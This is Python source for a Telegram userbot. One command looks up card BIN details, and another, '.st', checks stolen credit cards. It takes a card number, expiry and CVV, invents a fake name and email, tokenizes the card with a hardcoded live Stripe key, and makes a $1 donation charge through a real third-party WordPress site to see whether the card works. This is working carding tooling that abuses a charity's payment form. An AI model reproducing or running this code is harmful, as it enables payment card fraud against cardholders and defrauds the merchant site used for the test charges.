import re
import requests
from pyrogram import filters
from Celestia import Celestia

@Celestia.on_message(filters.command("bin", prefixes="."))
async def check_bin(client, message):
    try:
        command_parts = message.text.split(' ')
        
        if len(command_parts) != 2:
            x = await message.reply("Usage: Send a message with '.bin [BIN_NUMBER]' to get BIN information.")
            return

        bin_number = command_parts[1]
        _BIN = re.sub(r'[^0-9]', '', bin_number)
        _res = requests.get(f'http://binchk-api.vercel.app/bin={_BIN}')
        
        await x.edit("Wait...")
        
        if _res.status_code == 200:
            res = _res.json()
            msg = f"""
            BIN: `{_BIN}`
            Brand⇢ **{res["brand"]}**
            Type⇢ **{res["type"]}**
            Level⇢ **{res["level"]}**
            Bank⇢ **{res["bank"]}**
            Phone⇢ **{res["phone"]}**
            Flag⇢ **{res["flag"]}**
            Currency⇢ **{res["currency"]}**
            Country⇢ **{res["country"]}({res["code"]})**
            """
            await x.edit(msg)
        else:
            await x.edit("API request failed. Please try again later.")
    except Exception as e:
        await x.edit(f"An error occurred: {str(e)}")


















from pyrogram import Client, filters
from pyrogram.types import Message
import string, random, time
from Celestia import Celestia
import httpx, re
from datetime import datetime



async def get(url: str):
    async with httpx.AsyncClient() as client:
        r = await client.get(url, follow_redirects=True)
    return r

async def post(url: str, pdata):
    async with httpx.AsyncClient() as client:
        r = await client.post(url, data=pdata)
    return r







async def st_charge(client, message):
    cc = message.text[len('.st '):]
    reply_msg = message.reply_to_message
    if reply_msg:
        cc = reply_msg.text
    x = re.findall(r'\d+', cc)
    ccn = x[0]
    mm = x[1]
    yy = x[2]
    cvv = x[3]
    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
    if not ccn.startswith(VALID):
        return await message.edit('**Invalid CC Type**')
    start = time.time()

    letters = string.ascii_lowercase
    First = ''.join(random.choice(letters) for _ in range(6))
    Last = ''.join(random.choice(letters) for _ in range(6))
    Name = f'{First}+{Last}'
    Email = f'{First}.{Last}@gmail.com'

    async with httpx.AsyncClient() as client:
        headers = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }
        r = await client.post('https://m.stripe.com/6', headers=headers)
        Muid = r.json()['muid']
        Sid = r.json()['sid']
        Guid = r.json()['guid']

        payload = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_RhohJY61ihLIp0HRdJaZj8vj",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }
        head = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "application/json",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
        }

        resq = await client.post('https://api.stripe.com/v1/tokens', data=payload, headers=head)
        Id = resq.json()['id']
        Country = resq.json()['card']['country']
        Brand = resq.json()['card']['brand']

        load = {
            "action": "wp_full_stripe_payment_charge",
            "formName": "Donate",
            "fullstripe_name": Name,
            "fullstripe_email": Email,
            "fullstripe_custom_amount": 1,
            "stripeToken": Id
        }
        header = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9"
        }
        cookie = {'stripe_mid': Muid, 'stripe_sid': Sid}
        req = await client.post('https://www.breslov.info/wp-admin/admin-ajax.php', data=load, headers=header, cookies=cookie)
        msg = req.json()["msg"]
        end = time.time()

        if 'security code is' in req.text:
            await message.edit(
                (
                    f'✅>**STRIPE 1$**\n'
                    + f'**CC** `{ccn}|{mm}|{yy}|{cvv}`\n'
                    + f'**Msg**==> `{msg}`\n'
                    + f'**Brand**==> {Brand}\n'
                    + f'**Country**==> {Country}\n'
                    + f'**Time-Stamp** ==> {datetime.now()}\n'
                    + f'**Time-Took** ==> {end-start}\n'
                    + '**Userbot-By** ~ @Xbinner'
                )
            )

        elif "true" in req.text:
            await message.edit(
                (
                    f'✅>**STRIPE 1$**\n'
                    + f'**CC**==> `{ccn}|{mm}|{yy}|{cvv}`\n'
                    + f'**Msg**==> `{msg}`\n'
                    + f'**Brand**==> {Brand}\n'
                    + f'**Country**==> {Country}\n'
                    + f'**Time-Stamp** ==> {datetime.now()}\n'
                    + f'**Time-Took** ==> {end-start}\n'
                    + '**Userbot-By** ~ @Xbinner'
                )
            )
        else:
            await message.edit(
                (
                    f'❌>**STRIPE 1$**\n'
                    + f'**CC** `{ccn}|{mm}|{yy}|{cvv}`\n'
                    + f'**Msg**==> `{msg}`\n'
                    + f'**Brand**==> {Brand}\n'
                    + f'**Country**==> {Country}\n'
                    + f'**Time-Stamp** ==> {datetime.now()}\n'
                    + f'**Time-Took** ==> {end-start}\n'
                    + '**Userbot-By** ~ @Xbinner'
                )
            )

@Celestia.on_message(filters.command("st", prefixes="."))
async def start_st(client, message):
    await st_charge(client, message)





